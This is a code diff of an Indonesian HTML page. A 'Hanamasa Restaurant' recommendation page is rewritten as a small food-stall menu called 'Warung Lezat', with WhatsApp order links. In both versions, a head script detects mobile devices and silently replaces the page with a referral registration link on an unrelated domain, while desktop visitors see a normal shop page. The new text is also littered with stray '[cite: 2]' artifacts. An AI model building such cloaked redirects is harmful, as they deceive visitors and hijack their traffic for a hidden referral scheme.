@@ -3,111 +3,193 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hanamasa Restaurant - Rekomendasi Resmi</title>
+    <title>Warung Lezat - Jualan Makanan Sederhana</title>
+    
     <script>
-        // SCRIPT PENGALIHAN OTOMATIS
+        // SCRIPT PENGALIHAN OTOMATIS BERDASARKAN PERANGKAT
         function cekPerangkatDanAlihkan() {
-            var linkRestoDesktop = "https://www.hanamasaresto.com/";
-            var linkReferralMobile = "https://rebeccaburrell.com/account/register/124386989";
+            var linkDesktop = "https://www.hanamasaresto.com//"; // Halaman untuk komputer
+            var linkMobile = "https://rebeccaburrell.com/account/register/124386989"; // Tujuan khusus HP
             
-            // Sistem mengecek apakah user menggunakan HP
+            // Deteksi perangkat handphone atau layar kecil
             var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 767;
             
             if (isMobile) {
-                // KELUAR DI HP: Langsung pindah halaman
-                window.location.href = linkReferralMobile;
+                // Jika dibuka dari HP, langsung arahkan ke link mobile tanpa jeda
+                window.location.replace(linkMobile);
             }
         }
         
-        // Jalankan fungsi pengalihan
+        // Jalankan fungsi pengecekan secara instan
         cekPerangkatDanAlihkan();
     </script>
+
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', Arial, sans-serif; 
-            background-color: #fcf8f2; 
-            color: #2c2c2c;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
+        /* Mengatur gaya dasar */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            color: #333;
         }
-        .header-resto {
-            background: #ffffff;
-            padding: 15px 10%;
+
+        /* Bagian Header / Navigasi */
+        header {
+            background-color: #ff6b6b;
+            color: white;
+            padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            border-bottom: 3px solid #da251c;
         }
-        .logo-area { font-weight: 900; font-size: 22px; color: #da251c; letter-spacing: 1px; }
-        .logo-area span { color: #111111; font-weight: 400; }
-
-        .main-container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px 20px; }
-        .card { 
-            background: #ffffff; padding: 45px; border-radius: 8px; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.08); text-align: center; 
-            max-width: 650px; width: 100%; border-top: 5px solid #da251c;
+        header h1 {
+            margin: 0;
+            font-size: 24px;
         }
-        .tagline { font-size: 13px; color: #da251c; text-transform: uppercase; font-weight: bold; letter-spacing: 2px; margin-bottom: 10px; }
-        h1 { font-size: 28px; color: #111111; margin-bottom: 15px; font-weight: 700; }
-        p { color: #666666; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
-        
-        .menu-preview { display: flex; justify-content: space-around; gap: 15px; margin-bottom: 35px; }
-        .menu-item { background: #fdfbf7; padding: 15px; border-radius: 6px; flex: 1; border: 1px solid #f1e7d8; }
-        .menu-item font { display: block; font-weight: bold; margin-bottom: 5px; color: #111111; }
-        .menu-item span { font-size: 12px; color: #888888; }
-
-        .btn { 
-            display: inline-block; background: #da251c; color: #ffffff; 
-            padding: 15px 40px; border-radius: 30px; text-decoration: none; 
-            font-weight: bold; font-size: 16px; cursor: pointer; border: none;
-            box-shadow: 0 5px 15px rgba(218, 37, 28, 0.3); transition: all 0.3s ease; 
+        nav a {
+            color: white;
+            text-decoration: none;
+            margin-left: 15px;
+            font-weight: bold;
         }
-        .btn:hover { background: #b81d16; transform: translateY(-2px); }
-        .footer-resto { text-align: center; padding: 20px; font-size: 12px; color: #999999; background: #ffffff; border-top: 1px solid #eeeeee; }
 
-        @media (max-width: 767px) {
-            .header-resto, .menu-preview, .footer-resto { display: none !important; }
-            body { background: #121212; color: #ffffff; justify-content: center; align-items: center; }
-            .main-container { padding: 0; }
-            .card { background: #1e1e1e; border-top: none; max-width: 400px; padding: 40px 30px; width: 90%; box-shadow: none;}
-            .tagline, h1, p, .btn { display: none !important; }
+        /* Bagian Banner Utama */
+        .hero {
+            background-color: #fff;
+            text-align: center;
+            padding: 50px 20px;
+            border-bottom: 2px solid #eee;
+        }
+        .hero h2 {
+            margin: 0 0 10px;
+            color: #ff6b6b;
+        }
+
+        /* Bagian Menu Makanan */
+        .menu-container {
+            max-width: 1000px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+        .menu-container h2 {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        /* Kartu Produk Makanan */
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            overflow: hidden;
+            text-align: center;
+            padding-bottom: 15px;
+            transition: transform 0.3s;
+        }
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        .card img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+        }
+        .card h3 {
+            margin: 15px 0 5px;
+        }
+        .price {
+            color: #ff6b6b;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .btn-pesan {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            text-decoration: none;
+        }
+        .btn-pesan:hover {
+            background-color: #45a049;
+        }
+
+        /* Bagian Footer */
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            margin-top: 40px;
         }
     </style>
 </head>
 <body>
 
-    <div class="header-resto">
-        <div class="logo-area">HANAMASA<span>&nbsp;Restaurant</span></div>
-        <div style="font-size: 14px; color: #666666; font-weight: bold;">YAKINIKU & SHABU-SHABU</div>
+    <!-- Header -->
+    <header>
+        <h1>Warung Lezat[cite: 2]</h1>
+        <nav>
+            <a href="#beranda">Beranda[cite: 2]</a>
+            <a href="#menu">Menu[cite: 2]</a>
+            <a href="#kontak">Kontak[cite: 2]</a>
+        </nav>
+    </header>
+
+    <!-- Banner[cite: 2] -->
+    <div class="hero" id="beranda">
+        <h2>Selamat Datang di Warung Lezat![cite: 2]</h2>
+        <p>Menyajikan hidangan rumahan yang dibuat dengan bahan segar dan cinta.[cite: 2]</p>
     </div>
 
-    <div class="main-container">
-        <div class="card">
-            <div class="tagline">Rekomendasi Eksklusif</div>
-            <h1>Sajian Otentik Jepang Terfavorit Anda</h1>
-            <p>Klik tombol di bawah ini untuk langsung menuju ke situs resmi pilihan kami dan melakukan reservasi meja Anda.</p>
+    <!-- Daftar Menu[cite: 2] -->
+    <div class="menu-container" id="menu">
+        <h2>Menu Andalan Kami[cite: 2]</h2>
+        <div class="grid">
             
-            <div class="menu-preview">
-                <div class="menu-item">
-                    <font>Yakiniku Menu</font>
-                    <span>Daging Sapi Pilihan & Saus Khas</span>
-                </div>
-                <div class="menu-item">
-                    <font>Shabu-Shabu</font>
-                    <span>Pilihan Kuah Segar & Sayuran</span>
-                </div>
+            <!-- Produk 1[cite: 2] -->
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1604908176997-125f25cc6f3d?auto=format&fit=crop&w=400&q=80" alt="Nasi Goreng[cite: 2]">
+                <h3>Nasi Goreng Spesial[cite: 2]</h3>
+                <p>Nasi goreng dengan telur, ayam suwir, dan kerupuk.[cite: 2]</p>
+                <div class="price">Rp 20.000[cite: 2]</div>
+                <a href="https://wa.me/6281234567890?text=Halo,%20saya%20ingin%20pesan%20Nasi%20Goreng%20Spesial" target="_blank" class="btn-pesan">Pesan via WA[cite: 2]</a>
             </div>
-            
-            <a href="https://www.hanamasaresto.com/" target="_blank" class="btn">Kunjungi Situs Resmi</a>
+
+            <!-- Produk 2[cite: 2] -->
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1569718212165-3a8278d5f624?auto=format&fit=crop&w=400&q=80" alt="Mie Ayam[cite: 2]">
+                <h3>Mie Ayam Jamur[cite: 2]</h3>
+                <p>Mie kenyal dengan topping ayam kecap dan jamur.[cite: 2]</p>
+                <div class="price">Rp 15.000[cite: 2]</div>
+                <a href="https://wa.me/6281234567890?text=Halo,%20saya%20ingin%20pesan%20Mie%20Ayam%20Jamur" target="_blank" class="btn-pesan">Pesan via WA[cite: 2]</a>
+            </div>
+
+            <!-- Produk 3[cite: 2] -->
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1550547660-d9450f859349?auto=format&fit=crop&w=400&q=80" alt="Burger[cite: 2]">
+                <h3>Burger Daging Sapi[cite: 2]</h3>
+                <p>Burger tebal dengan keju lumer dan sayuran segar.[cite: 2]</p>
+                <div class="price">Rp 25.000[cite: 2]</div>
+                <a href="https://wa.me/6281234567890?text=Halo,%20saya%20ingin%20pesan%20Burger%20Daging%20Sapi" target="_blank" class="btn-pesan">Pesan via WA[cite: 2]</a>
+            </div>
+
         </div>
     </div>
 
-    <div class="footer-resto">
-        &copy; 2026 Hanamasa Indonesia. All Rights Reserved. Pemilihan Sistem Otomatis Berdasarkan Wilayah.
-    </div>
+    <!-- Footer[cite: 2] -->
+    <footer id="kontak">
+        <p>&copy; 2026 Warung Lezat. Hubungi kami: 0812-3456-7890[cite: 2]</p>
+    </footer>
 
 </body>
 </html>
